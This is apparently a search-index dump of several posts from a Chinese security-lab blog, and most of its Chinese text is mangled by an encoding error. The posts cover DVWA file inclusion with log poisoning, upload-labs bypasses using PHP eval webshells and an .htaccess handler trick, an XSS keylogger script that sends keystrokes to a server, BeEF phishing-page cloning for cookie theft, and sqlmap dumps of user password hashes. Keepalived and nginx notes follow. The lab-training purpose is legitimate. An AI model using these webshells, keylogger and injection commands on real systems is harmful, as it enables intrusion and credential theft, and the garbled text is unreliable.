pageå‚æ•°æ”¹ä¸ºè¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶åœ°å€ï¼›**æ­¤å¤„æ³¨æ„åŒ…å«çš„è¿œç¨‹æ–‡ä»¶ä¸èƒ½ä¸º.phpæ–‡ä»¶ï¼Œå¦åˆ™å°†ç›´æ¥è¿”å›è¿œç¨‹æ–‡ä»¶ã€‚æ­£ç¡®çš„åšæ³•æ˜¯ï¼ŒåŒ…å«ä¸€ä¸ªå¦‚ï¼š.txtåç¼€çš„æ–‡ä»¶ï¼Œä½¿å¾—è¢«æ”»å‡»æœºå™¨è¯»å–å¹¶æ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚ **\n3.3 ä¸­é—´ä»¶æ—¥å¿—åŒ…å« DVWAå®‰å…¨ç­‰çº§ï¼šLow\nDVWAä¸­ï¼Œapache2æ—¥å¿—æ–‡ä»¶è·¯å¾„ä¸ºï¼š /var/log/apache2/access.log åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼Œéœ€è¦å…ˆå¯¹æ–‡ä»¶å’Œç›®å½•æ·»åŠ æƒé™ï¼Œè®©webç«¯æœ‰æƒé™å»è®¿é—®ï¼š\n[root@centos7 ~]# docker exec -it dvwa bash root@81bfa8dbf381:/# chmod 755 /var/log/apache2/ root@81bfa8dbf381:/# chmod 644 /var/log/apache2/access.log ä¿®æ”¹å®Œæƒé™åï¼Œå¼€å¯burpæŠ“åŒ…ï¼Œç„¶åè®¿é—®URL\nhttp://172.31.5.7/vulnerabilities/fi/?page=\u0026lt;?php eval(@$_POST[\u0026#39;a\u0026#39;]);?\u0026gt; åœ¨burpä¸­å¯ä»¥çœ‹åˆ°ï¼ŒURLè¢«é‡æ–°ç¼–ç äº†\næŸ¥çœ‹æ—¥å¿—æ–‡ä»¶éªŒè¯ï¼Œæ—¥å¿—æ–‡ä»¶è®°å½•çš„æ˜¯URLç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬ï¼Œæ˜¯ä¸èƒ½æˆåŠŸæ‰§è¡Œçš„\nå› æ­¤éœ€è¦åœ¨burpä¸­å°†URLæ”¹ä¸ºæ­£å¸¸çš„URLï¼Œç„¶åForward\nå†æ¬¡æŸ¥çœ‹æ—¥å¿—éªŒè¯ç»“æœï¼Œå‘ç°ä¸€å¥è¯æœ¨é©¬è¢«æˆåŠŸè®°å½•åˆ°æ—¥å¿—\nä½¿ç”¨èšå‰‘é“¾æ¥ï¼Œæ³¨æ„è¦é…ç½®Cookieï¼ˆDVWAéœ€è¦ç™»å½•ï¼‰\nä¸€å¥è¯æœ¨é©¬åˆ©ç”¨æˆåŠŸ\n","permalink":"https://senmer.github.io/zh/posts/tech/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","summary":"\u003cp\u003eï¼ˆ1ï¼‰DVWAç¯å¢ƒä¸‹å»åŒ…å«å…¶ä»–ç›®å½•çš„ä»»æ„3ä¸ªæ–‡ä»¶ï¼Œè¦æ±‚ä½¿ç”¨ç›¸å¯¹è·¯å¾„\nï¼ˆ2ï¼‰è¿œç¨‹æ–‡ä»¶åŒ…å«\nï¼ˆ3ï¼‰ä¸­é—´ä»¶æ—¥å¿—åŒ…å«ç»•è¿‡ï¼Œè¦æ±‚ä½¿ç”¨èšå‰‘è¿æ¥æˆåŠŸ\u003c/p\u003e","title":"æ–‡ä»¶åŒ…å«"},{"content":"ï¼ˆ1ï¼‰å®¢æˆ·ç«¯ç»•è¿‡ç»ƒä¹  ï¼ˆ2ï¼‰æœåŠ¡ç«¯é»‘åå•ç»•è¿‡ï¼šç»™å‡º.htaccessæ–‡ä»¶ç»•è¿‡çš„å…·ä½“æ­¥éª¤\nä¸€ã€å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP upload-labs latest docker run -d -p 8081:80 \u0026ndash;name upload-labs cuer/upload-labs 172.31.5.7 äºŒã€å®¢æˆ·ç«¯ç»•è¿‡ 2.1 æºç åˆ†æ æµè§ˆå™¨è®¿é—® http://172.31.5.7:8081/Pass-01ï¼Œé€‰æ‹©Pass-01\nç›´æ¥ä¸Šä¼ phpåç¼€çš„æ–‡ä»¶a.phpä¼šè¢«æ‹’ç»\nç‚¹å‡»å³ä¸Šè§’æ˜¾ç¤ºæºç ï¼š\nåˆ†ææºç å¯çŸ¥ï¼Œæ­¤æ–‡ä»¶ä¸Šä¼ ç±»å‹æ˜¯é€šè¿‡å‰ç«¯jsè¿›è¡Œé™åˆ¶ï¼Œå› æ­¤å¯é€šè¿‡ç¦ç”¨æµè§ˆå™¨çš„jsæ¥ç»•è¿‡\n2.2 ç¦ç”¨æµè§ˆå™¨js googleæµè§ˆå™¨ï¼šè®¾ç½®â€”â€”éšç§ä¸å®‰å…¨æ€§â€”â€”ç½‘ç«™è®¾ç½®â€”â€”JavaScriptâ€”â€”ä¸å…è®¸ç½‘ç«™ä½¿ç”¨JavaScriptï¼ˆä¹Ÿå¯é€šè¿‡æ·»åŠ ç™½åå•çš„æ–¹å¼ï¼Œä¸å½±å“æµè§ˆå™¨æ­£å¸¸ä½¿ç”¨ï¼‰\n2.3 ä¸Šä¼ æœ¨é©¬ å‡†å¤‡ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶a.phpï¼Œå†…å®¹ï¼š\n\u0026lt;?php eval(@$_GET[\u0026#39;a\u0026#39;]);?\u0026gt; åˆ·æ–°åï¼Œå†æ¬¡ä¸Šä¼ a.phpæ–‡ä»¶æˆåŠŸ\nå³é”®ä¸Šä¼ çš„æ–‡ä»¶è·å–å›¾ç‰‡åœ°å€ï¼šhttp://172.31.5.7:8081/upload/a.php\næµè§ˆå™¨è®¿é—® http://172.31.5.7:8081/upload/a.php?a=phpinfo();\næˆåŠŸæ¤å…¥ä¸€å¥è¯æœ¨é©¬:\n2.2 èšå‰‘è¿æ¥ é‡æ–°ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬shell.phpï¼Œå†…å®¹ï¼š\n\u0026lt;?php eval(@$_POST[\u0026#39;passwd\u0026#39;]);?\u0026gt; ä½¿ç”¨èšå‰‘è¿æ¥ä¸€å¥è¯æœ¨é©¬ï¼ˆå¯†ç ä¸ºä¸€å¥è¯æœ¨é©¬å†…å®¹ä¸­çš„å‚æ•°passwdï¼‰\nä¸‰ã€htaccessæ–‡ä»¶ç»•è¿‡ 3.1 æ¼æ´åŸç† htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼š ç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œæ¥ç»•è¿‡é»‘åå•ã€‚ å‰ææ¡ä»¶ 1.mod_rewriteæ¨¡å—å¼€å¯ã€‚ 2.AllowOverride All Upload-labsï¼ˆPass-04ï¼‰æºç åˆ†æï¼Œè¿™ä¸ªæ¯”03å¢åŠ äº†é»‘åå•é‡ã€‚ä½†æ˜¯ï¼Œä¸­é—´ä»¶ä¸ºApacheçš„æƒ…å†µä¸‹ï¼Œé»‘ åå•æœªæ ¡éªŒhtaccessæ–‡ä»¶ï¼Œå¯¼è‡´å¯ä¸Šä¼ htaccessæ–‡ä»¶ï¼Œç»•è¿‡é»‘åå•æ£€æµ‹ã€‚\næºç å¦‚ä¸‹ï¼š\nç”±äº.htaccessè¿˜æ˜¯æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥é‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ª .htaccessã€‚æ–‡ä»¶ä¸­é…ç½®å¯ä½¿å¾—å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶éƒ½ä½¿ç”¨PHPè§£æï¼Œé‚£ä¹ˆæ— è®ºä¸Šä¼ ä»»ä½•æ–‡ä»¶ï¼Œåªè¦æ–‡ä»¶å†…å®¹ç¬¦åˆPHPè¯­è¨€ä»£ç è§„èŒƒï¼Œå°±ä¼šè¢«å½“ä½œPHPæ‰§è¡Œã€‚\næˆ‘ä»¬éœ€è¦å…ˆå‡†å¤‡å¥½ä¸¤ä¸ªæ–‡ä»¶ï¼ˆ .htaccess å’Œ test.jpgï¼‰æ³¨æ„ï¼š.htaccessæ–‡ä»¶åå°±æ˜¯ .htaccess ï¼Œä¸èƒ½ä¿®æ”¹ä¸ºå…¶å®ƒåç§°ã€‚è¯¥æ–‡ä»¶åœ¨windowså¦‚æœä¸èƒ½ç›´æ¥ä¿®æ”¹åç§°ï¼Œå¯æ‰“å¼€è®°äº‹æœ¬ç¼–è¾‘åï¼Œé€‰æ‹©å¦å­˜ä¸ºï¼ˆä¿å­˜ç±»å‹ï¼šæ‰€æœ‰ç±»å‹ï¼‰å³å¯ç”Ÿæˆã€‚æˆ–è€…å‚è€ƒç½‘ä¸Šå…¶å®ƒæ–¹å¼\n.htaccess:\n\u0026lt;FilesMatch \u0026#34;test.jpg\u0026#34;\u0026gt; Sethandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; \u0026lt;IfModule mime_module\u0026gt; SetHandler application/x-httpd-php \u0026lt;/IfModule\u0026gt; test.jpg\n\u0026lt;?php @eval($_POST[\u0026#34;passwd\u0026#34;]);?\u0026gt; 3.2 å¼€å§‹ç»•è¿‡ 3.2.1 ä¸Šä¼ .htaccess 3.2.2 ä¸Šä¼ test.jpg 3.2.3 ä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥ ","permalink":"https://senmer.github.io/zh/posts/tech/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/","summary":"\u003cp\u003eï¼ˆ1ï¼‰å®¢æˆ·ç«¯ç»•è¿‡ç»ƒä¹ \nï¼ˆ2ï¼‰æœåŠ¡ç«¯é»‘åå•ç»•è¿‡ï¼šç»™å‡º.htaccessæ–‡ä»¶ç»•è¿‡çš„å…·ä½“æ­¥éª¤\u003c/p\u003e","title":"æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"},{"content":"ï¼ˆ1ï¼‰ä½¿ç”¨pikachuå¹³å°ç»ƒä¹ XSSé”®ç›˜è®°å½•ã€å‰å°XSSç›²æ‰“æ”»å‡»è·å–cookie ï¼ˆ2ï¼‰ä½¿ç”¨beefè¿›è¡Œé’“é±¼ï¼Œè·å–ç”¨æˆ·cookie\nä¸€ã€å®éªŒç¯å¢ƒ è½¯ä»¶å ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IPåœ°å€ BeEF latest å®‰è£…å‘½ä»¤ï¼šsudo apt install -y beef-xss 172.31.5.9 Pikachu Version 1.10 Development (Release date: 2015-10-08) å®‰è£…å‘½ä»¤ï¼šdocker run -d -p 80:80 \u0026ndash;name pikachu area39/pikachu 172.31.5.7 äºŒã€å®éªŒå¼€å§‹ 2.1 XSS ç›²æ‰“ XSSç›²æ‰“æ˜¯ä¸€ç§æ”»å‡»åœºæ™¯ï¼Œä¹Ÿæ˜¯å±äºå­˜å‚¨å‹XSSç±»å‹ã€‚ ç›²æ‰“çš„æ„æ€æ˜¯æ— æ³•ç›´æ¥åœ¨å‰ç«¯çœ‹åˆ°åé¦ˆæ•ˆæœï¼Œåªæœ‰åå°èƒ½çœ‹åˆ°è¾“å…¥çš„å†…å®¹ï¼Œä»å‰ç«¯æ— æ³•åˆ¤æ–­æ˜¯å¦å­˜åœ¨ XSSï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ç›´æ¥å¾€é‡Œé¢æ’å…¥XSSä»£ç ï¼Œç„¶åç­‰å¾…ï¼Œå½“ç®¡ç†å‘˜æŸ¥çœ‹æ—¶å°±ä¼šé­åˆ°xssæ”»å‡»ã€‚\næ‰“å¼€pikachuç›²æ‰“æ¨¡å—ï¼Œè¾“å…¥å¸¸è§„çš„payloadï¼Œç„¶åæäº¤\n\u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt; æ ¹æ®æç¤ºç™»å½•åå° http://172.31.5.7/vul/xss/xssblind/admin_login.php\nç™»å½•åå¼¹çª—ï¼Œè·å¾—è´¦å·çš„cookie\n1.2 é”®ç›˜è®°å½•\né”®ç›˜è®°å½•ï¼Œåˆ©ç”¨pikachuè‡ªå¸¦è„šæœ¬æ¥å®ç°\næŸ¥çœ‹è„šæœ¬å†…å®¹ï¼š\n[root@centos7 ~]# docker exec -it pikachu bash -c \u0026#34;cat /var/www/html/pkxss/rkeypress/rk.js\u0026#34; /** * Created by runner on 2018/7/8. */ function createAjax(){ var request=false; if(window.XMLHttpRequest){ request=new XMLHttpRequest(); if(request.overrideMimeType){ request.overrideMimeType(\u0026#34;text/xml\u0026#34;); } }else if(window.ActiveXObject){ var versions=[\u0026#39;Microsoft.XMLHTTP\u0026#39;, \u0026#39;MSXML.XMLHTTP\u0026#39;, \u0026#39;Msxml2.XMLHTTP.7.0\u0026#39;,\u0026#39;Msxml2.XMLHTTP.6.0\u0026#39;,\u0026#39;Msxml2.XMLHTTP.5.0\u0026#39;, \u0026#39;Msxml2.XMLHTTP.4.0\u0026#39;, \u0026#39;MSXML2.XMLHTTP.3.0\u0026#39;, \u0026#39;MSXML2.XMLHTTP\u0026#39;]; for(var i=0; i\u0026lt;versions.length; i++){ try{ request=new ActiveXObject(versions[i]); if(request){ return request; } }catch(e){ request=false; } } } return request; } var ajax=null; var xl=\u0026#34;datax=\u0026#34;; function onkeypress() { var realkey = String.fromCharCode(event.keyCode); xl+=realkey; show(); } document.onkeypress = onkeypress; function show() { ajax = createAjax(); ajax.onreadystatechange = function () { if (ajax.readyState == 4) { if (ajax.status == 200) { var data = ajax.responseText; } else { alert(\u0026#34;é¡µé¢è¯·æ±‚å¤±è´¥\u0026#34;); } } } var postdate = xl; ajax.open(\u0026#34;POST\u0026#34;, \u0026#34;http://192.168.1.15/pkxss/rkeypress/rkserver.php\u0026#34;,true); ajax.setRequestHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); ajax.setRequestHeader(\u0026#34;Content-length\u0026#34;, postdate.length); ajax.setRequestHeader(\u0026#34;Connection\u0026#34;, \u0026#34;close\u0026#34;); ajax.send(postdate); ä¿®æ”¹è„šæœ¬ä¸­çš„IPä¸ºpikachuåœ°å€\n[root@centos7 ~]# docker exec -it pikachu bash -c \u0026#34;sed -i \u0026#34;s/192\\.168\\.1\\.15/172.31.5.7/\u0026#34; /var/www/html/pkxss/rkeypress/rk.js\u0026#34; #æŸ¥çœ‹ä¿®æ”¹ç»“æœ [root@centos7 ~]# docker exec -it pikachu bash -c \u0026#34;cat /var/www/html/pkxss/rkeypress/rk.js | grep http\u0026#34; ajax.open(\u0026#34;POST\u0026#34;, \u0026#34;http://172.31.5.7/pkxss/rkeypress/rkserver.php\u0026#34;,true); åœ¨å­˜å‚¨å‹XSSæ¨¡å—ä¸­è¾“å…¥payload\n\u0026lt;script src=\u0026#34;http://172.31.5.7/pkxss/rkeypress/rk.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; åœ¨å½“å‰æ ‡ç­¾é¡µéšæ„ç‚¹å‡»å‡ ä¸ªæŒ‰é”®ï¼ˆå¦‚ï¼štestï¼‰\nç™»å½•åå°\nè·å–åˆ°äº†é”®ç›˜è®°å½•\n2.2 åˆ©ç”¨Beef-XSSè·å–cookie BeEFï¼ˆBrowser Exploitation Frameworkï¼‰æ˜¯ä¸€æ¬¾éå¸¸å¼ºå¤§çš„Webæ¡†æ¶æ”»å‡»å¹³å°ï¼Œé›†æˆäº†è®¸å¤š payloadï¼Œå¯ä»¥é€šè¿‡XSSæ¼æ´é…åˆJavaScriptè„šæœ¬å’ŒMetasploitè¿›è¡Œæ¸—é€ã€‚åŸºäºRubyè¯­è¨€ç¼–å†™ï¼Œå¹¶ä¸”æ”¯æŒ å›¾å½¢åŒ–ç•Œé¢ï¼Œæ“ä½œç®€å•ã€‚\n2.2.1 å®‰è£…beef-xss æ‰“å¼€kaliç³»ç»Ÿï¼ˆ172.31.5.9ï¼‰\n#å®‰è£…beef sudo apt install -y beef-xss ä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­çš„IPå’Œé»˜è®¤å¯†ç ï¼ˆä¸ä¿®æ”¹æ— æ³•å¯åŠ¨ï¼‰\nâ”Œâ”€â”€(rootã‰¿kali)-[/usr/share/beef-xss] â””â”€# cat /usr/share/beef-xss/config.yaml |grep passwd passwd: \u0026#34;123\u0026#34; â”Œâ”€â”€(rootã‰¿kali)-[/usr/share/beef-xss] â””â”€# cat /usr/share/beef-xss/config.yaml |grep host host: \u0026#34;172.31.5.9\u0026#34; å¯åŠ¨beef\ncd /usr/share/beef-xss \u0026amp;\u0026amp; ./beef æµè§ˆå™¨è®¿é—®ï¼šhttp://172.31.5.9:3000/ui/panel\nä½¿ç”¨è´¦å· beef/123 ç™»å½•ï¼š\n2.2.2 åˆ¶ä½œé’“é±¼é¡µé¢ ç”¨æ³•è¯´æ˜ï¼š\ncurl -H \u0026#34;Content-Type: application/json; charset=UTF-8\u0026#34; -d \u0026#39;{\u0026#34;url\u0026#34;:\u0026#34;\u0026lt;URL of site to clone\u0026gt;\u0026#34;, \u0026#34;mount\u0026#34;:\u0026#34;\u0026lt;where to mount\u0026gt;\u0026#34;}\u0026#39; -X POST http://\u0026lt;BeEFURL\u0026gt;/api/seng/clone_page?token=\u0026lt;token\u0026gt; // \u0026lt;URL of site to clone\u0026gt; éœ€è¦å…‹éš†çš„ç½‘å€ // \u0026lt;where to mount\u0026gt; å…‹éš†çš„é¡µé¢åœ¨æœåŠ¡å™¨çš„å“ªä¸ªè·¯å¾„è®¿é—® // \u0026lt;token\u0026gt; æœåŠ¡å¯åŠ¨æ—¶çš„ beef API key ç¤ºä¾‹ï¼šå…‹éš†ç™¾åº¦ä¸»é¡µé¢\nâ”Œâ”€â”€(rootã‰¿kali)-[/usr/share/beef-xss] â””â”€# curl -H \u0026#34;Content-Type: application/json; charset=UTF-8\u0026#34; -d \u0026#39;{\u0026#34;url\u0026#34;:\u0026#34;https://www.baidu.com\u0026#34;,\u0026#34;mount\u0026#34;:\u0026#34;/baidu\u0026#34;}\u0026#39; -X POST http://172.31.5.9:3000/api/seng/clone_page?token=a7e0f6aaccfed873134b9f458f29824aaf9ebd7a {\u0026#34;success\u0026#34;:true,\u0026#34;mount\u0026#34;:\u0026#34;/baidu\u0026#34;} å…‹éš†æˆåŠŸ\n2.2.3 è·å–ç”¨æˆ·cookie æ¨¡æ‹Ÿç”¨æˆ·è®¿é—®è¯¥é’“é±¼é¡µé¢ http://172.31.5.9:3000/baidu\nç™»é™†beefï¼Œå‘ç°æœ‰æœºå™¨ä¸Šçº¿\nè·å¾—ç”¨æˆ·cookie\néªŒè¯ç»“æœ\n","permalink":"https://senmer.github.io/zh/posts/tech/xss/%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96cookie/","summary":"\u003cp\u003eï¼ˆ1ï¼‰ä½¿ç”¨pikachuå¹³å°ç»ƒä¹ XSSé”®ç›˜è®°å½•ã€å‰å°XSSç›²æ‰“æ”»å‡»è·å–cookie\nï¼ˆ2ï¼‰ä½¿ç”¨beefè¿›è¡Œé’“é±¼ï¼Œè·å–ç”¨æˆ·cookie\u003c/p\u003e","title":"åˆ©ç”¨XSSæ¼æ´è·å–cookie"},{"content":"ä½¿ç”¨Sqlmapå·¥å…·å®Œæˆå¯¹DVWAæ•°æ®åº“çš„æ³¨å…¥è¿‡ç¨‹ï¼Œè¦æ±‚æŒ‰ç…§åº“ã€è¡¨ã€åˆ—ã€å†…å®¹çš„é¡ºåºè¿›è¡Œæ³¨å…¥ï¼›\nä¸€ã€ å®éªŒç¯å¢ƒ è½¯ä»¶å ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IPåœ°å€ sqlmap 1.6.11#stable kaliè‡ªå¸¦ 172.31.5.38 DVWA Version 1.10 Development (Release date: 2015-10-08) docker run -d -p 80:80 docker.io/sagikazarmark/dvwa 172.31.5.7 äºŒã€ å¼€å§‹æ³¨å…¥ 2.1 è¿›å…¥DVWA SQL Injectionæ¨¡å— DVWAæ˜¯éœ€è¦ç™»å½•çš„ï¼Œå› æ­¤çˆ†ç ´æ—¶éœ€è¦æºå¸¦cookieä¿¡æ¯ã€‚\nåœ¨è¾“å…¥æ¡†è¾“å…¥æ•°å­—1æäº¤ï¼Œåœ¨åœ°å€æ è·å¾—è¦æ³¨å…¥çš„urlï¼ˆæœ¬æ¡ˆä¾‹ä¸­æ³¨å…¥å­—æ®µå°±æ˜¯idï¼‰\nè°ƒæ•´ DVWA Security çš„å®‰å…¨çº§åˆ«ä¸ºlow\n2.2 åˆ¤æ–­æ³¨å…¥ç‚¹ â”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# sqlmap --batch -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\u0026#34; -p id # -p æŒ‡å®šæ³¨å…¥å‚æ•°ä¸ºid #è·å¾—æ•°æ®åº“ç‰ˆæœ¬ web server operating system: Linux Debian 8 (jessie) web application technology: Apache 2.4.10 back-end DBMS: MySQL \u0026gt;= 5.0 2.3 è·å–mysqlä¸­çš„æ‰€æœ‰åº“ â”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# sqlmap --batch -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\u0026#34; --dbs #è·å¾—æ•°æ®åº“åˆ—è¡¨ available databases [4]: [*] dvwa [*] information_schema [*] mysql [*] performance_schema 2.4 è·å–dvwaåº“ä¸­çš„æ‰€æœ‰è¡¨ â”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# sqlmap --batch -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\u0026#34; -D dvwa --tables #è·å¾—è¡¨ Database: dvwa [2 tables] +-----------+ | guestbook | | users | +-----------+ 2.5 è·å–usersè¡¨ä¸­çš„æ‰€æœ‰å­—æ®µ â”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# sqlmap --batch -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\u0026#34; -D dvwa -T users --columns #è·å¾—è¡¨ä¸­çš„å­—æ®µ Database: dvwa Table: users [8 columns] +--------------+-------------+ | Column | Type | +--------------+-------------+ | user | varchar(15) | | avatar | varchar(70) | | failed_login | int(3) | | first_name | varchar(15) | | last_login | timestamp | | last_name | varchar(15) | | password | varchar(32) | | user_id | int(6) | +--------------+-------------+ 2.6 è·å¾—userå’Œpassword â”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# sqlmap --batch -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\u0026#34; -D dvwa -T users -C last_name,password --dump #è·å¾—è´¦å·ä¿¡æ¯ Database: dvwa Table: users [5 entries] +-----------+---------------------------------------------+ | last_name | password | +-----------+---------------------------------------------+ | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | | Brown | e99a18c428cb38d5f260853678922e03 (abc123) | | Me | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | | Picasso | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | | Smith | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | +-----------+---------------------------------------------+ ","permalink":"https://senmer.github.io/zh/posts/tech/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/","summary":"\u003cp\u003eä½¿ç”¨Sqlmapå·¥å…·å®Œæˆå¯¹DVWAæ•°æ®åº“çš„æ³¨å…¥è¿‡ç¨‹ï¼Œè¦æ±‚æŒ‰ç…§åº“ã€è¡¨ã€åˆ—ã€å†…å®¹çš„é¡ºåºè¿›è¡Œæ³¨å…¥ï¼›\u003c/p\u003e","title":"ä½¿ç”¨sqlmapæ³¨å…¥DVWAæ•°æ®åº“"},{"content":"äºŒè¿›åˆ¶å®‰è£…Keepalived\næ”¯æŒçš„ç³»ç»Ÿï¼šCentos7\n#!/bin/bash keepalived_version=\u0026#39;keepalived-2.0.20.tar.gz\u0026#39; source_package_path=\u0026#39;/usr/local/src/\u0026#39; yum -y install gcc gcc-c++ curl openssl-devel libnl3-devel net-snmp-devel [ ! -e $source_package_path/$keepalived_version ] \u0026amp;\u0026amp; wget https://keepalived.org/software/$keepalived_version -P $source_package_path cd $source_package_path \u0026amp;\u0026amp; tar xf $keepalived_version cd $source_package_path/$(echo $keepalived_version | sed -r \u0026#39;s/(.*).tar.gz/\\1/\u0026#39;)/ \u0026amp;\u0026amp; ./configure --prefix=/usr/local/keepalived --disable-fwmark # --prefix=/usr/local/keepalived æŒ‡å®šå®‰è£…ç›®å½• make \u0026amp;\u0026amp; make install [ ! -d /etc/keepalived ] \u0026amp;\u0026amp; mkdir /etc/keepalived [ ! -f /etc/keepalived/keepalived.conf ] \u0026amp;\u0026amp; cat \u0026gt;\u0026gt; /etc/keepalived/keepalived.conf \u0026lt;\u0026lt; EOF global_defs { # notification_email { # root@localhost # } # notification_email_from keepalived@localhost # smtp_server 127.0.0.1 # smtp_connect_timeout 30 router_id node1 #ä¿®æ”¹æ­¤è¡Œ vrrp_skip_check_adv_addr vrrp_garp_interval 0 vrrp_gna_interval 0 vrrp_mcast_group4 224.0.0.22 } vrrp_instance VI_1 { state BACKUP interface ens33 virtual_router_id 66 priority 100 #ä¿®æ”¹æ­¤è¡Œ advert_int 1 authentication { auth_type PASS auth_pass 321321 } virtual_ipaddress { 172.31.5.20 ens33 label ens33:0 } } EOF ","permalink":"https://senmer.github.io/zh/posts/tech/shell/keepalived%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC/","summary":"\u003cp\u003eäºŒè¿›åˆ¶å®‰è£…Keepalived\u003c/p\u003e","title":"Keepalivedå®‰è£…è„šæœ¬"},{"content":"Nginxå®ç°ç½‘å€é‡å®šå‘\nNginxæœåŠ¡å™¨åˆ©ç”¨ ngx_http_rewrite_module æ¨¡å—è§£æå’Œå¤„ç†rewriteè¯·æ±‚ï¼Œæ­¤åŠŸèƒ½ä¾é  PCRE(perl compatible regular expression)ï¼Œå› æ­¤ç¼–è¯‘ä¹‹å‰è¦å®‰è£…PCREåº“ï¼Œrewriteæ˜¯nginxæœåŠ¡å™¨çš„é‡è¦åŠŸèƒ½ä¹‹ä¸€ï¼Œç”¨äºå®ç°URLçš„é‡å†™ï¼ŒURLçš„é‡å†™æ˜¯éå¸¸æœ‰ç”¨çš„åŠŸèƒ½ï¼Œæ¯”å¦‚å®ƒå¯ä»¥åœ¨æˆ‘ä»¬æ”¹å˜ç½‘ç«™ç»“æ„ä¹‹åï¼Œä¸éœ€è¦å®¢æˆ·ç«¯ä¿®æ”¹åŸæ¥çš„ä¹¦ç­¾ï¼Œä¹Ÿæ— éœ€å…¶ä»–ç½‘ç«™ä¿®æ”¹æˆ‘ä»¬çš„é“¾æ¥ï¼Œå°±å¯ä»¥è®¾ç½®ä¸ºè®¿é—®ï¼Œå¦å¤–è¿˜å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæé«˜ç½‘ç«™çš„å®‰å…¨æ€§ã€‚\nngx_http_rewrite_module æ¨¡å— å®˜æ–¹æ–‡æ¡£ï¼š https://nginx.org/en/docs/http/ngx_http_rewrite_module.html\nif æŒ‡ä»¤ å®˜æ–¹æ–‡æ¡£ï¼šhttps://nginx.org/en/docs/http/ngx_http_rewrite_module.html#if\nifæŒ‡ä»¤ç”¨äºæ¡ä»¶åŒ¹é…åˆ¤æ–­ï¼Œå¹¶æ ¹æ®æ¡ä»¶åˆ¤æ–­ç»“æœé€‰æ‹©ä¸åŒçš„Nginxé…ç½®ï¼Œå¯ä»¥é…ç½®åœ¨serveræˆ–locationå—ä¸­è¿›è¡Œé…ç½®ï¼ŒNginxçš„ifè¯­æ³•ä»…èƒ½ä½¿ç”¨ifåšå•æ¬¡åˆ¤æ–­ï¼Œä¸æ”¯æŒä½¿ç”¨if elseæˆ–è€…if elifè¿™æ ·çš„å¤šé‡åˆ¤æ–­ï¼Œç”¨æ³•å¦‚ä¸‹ï¼š\nif ï¼ˆæ¡ä»¶åŒ¹é…ï¼‰ { action } if 